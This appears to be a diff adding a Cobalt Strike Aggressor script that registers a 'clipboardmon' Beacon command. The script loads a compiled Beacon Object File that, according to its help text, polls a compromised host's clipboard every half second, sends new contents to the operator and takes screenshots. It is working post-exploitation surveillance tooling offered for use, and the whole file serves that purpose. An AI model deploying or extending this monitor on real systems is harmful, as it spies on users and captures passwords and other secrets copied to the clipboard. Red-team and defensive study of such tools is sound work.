@@ -1,0 +1,60 @@
+# author: Pim Beune
+
+alias clipboardmon
+{
+    local('$bid $barch $handle $data $args $mode @validmodes');
+
+    # Assign arguments to variables for readability
+    $bid = $1;
+    $barch  = barch($1);
+    $mode = lc($2);
+    @validmodes = @("start", "stop", "status");
+
+    # Verify number of args
+    if (size(@_) != 2)
+    {
+        berror($1, beacon_command_detail("clipboardmon"));
+        return;
+    }
+
+    # Verify mode is valid
+    if ($mode !in @validmodes)
+    {
+        berror($1, "Invalid mode!");
+        berror($1, beacon_command_detail("clipboardmon"));
+        return;
+    }
+
+    # read in the right BOF file
+    $handle = openf(script_resource("./dist/clipboardmon. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack the arguments
+    $args = bof_pack($bid, "z", $mode);
+
+    # Execute BOF
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+
+beacon_command_register(
+    "clipboardmon",
+    "Monitor for new clipboard content",
+    "
+Command: clipboardmon
+Summary: This BOF will monitor in the background for new contents in the clipboard every .5 seconds.
+         If new content is found, it will be printed to the console. Moreover, a screenshot will be
+         made to the screenshots tab to give more context for the current clipboard entry.
+
+Usage:   clipboardmon <command>
+                       command         - 'start' || 'stop' || 'status'
+                                       start:  installs the tool in Beacon.
+                                       stop:   removes tool from Beacon.
+                                       status: checks the status of tool in Beacon.
+Example:
+         clipboardmon start
+         clipboardmon stop
+         clipboardmon status
+"
+);
